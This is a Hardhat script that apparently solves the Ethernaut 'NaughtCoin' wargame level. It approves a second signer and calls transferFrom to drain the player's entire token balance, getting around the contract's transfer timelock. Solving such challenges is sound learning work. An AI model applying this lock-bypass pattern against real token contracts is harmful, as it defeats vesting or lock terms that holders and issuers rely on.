

import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x2b961E3959b79326A8e7F64Ef0d2d825707669b5"
const PLAYER_ADDRESS = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199"

async function main() {

    const [receiver] = await ethers.getSigners()
    const signer = await ethers.getSigner(PLAYER_ADDRESS)
    const contract = await ethers.getContractAt("NaughtCoin", CONTRACT_ADDRESS, signer)
    const contractWithReceiverAsSigner = await ethers.getContractAt("NaughtCoin", CONTRACT_ADDRESS, receiver)

    let balance = await contract.balanceOf(signer.address)
    console.log("Previous balance: ", balance);

    await contract.approve(receiver.address, balance,
        {
            gasLimit: ethers.BigNumber.from(`30000000`),
        }
    );

    await contractWithReceiverAsSigner.transferFrom(signer.address, receiver.address, balance,
        {
            gasLimit: ethers.BigNumber.from(`30000000`),
        }
    )
    balance = await contract.balanceOf(signer.address)
    console.log("New balance: ", balance);

}



// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});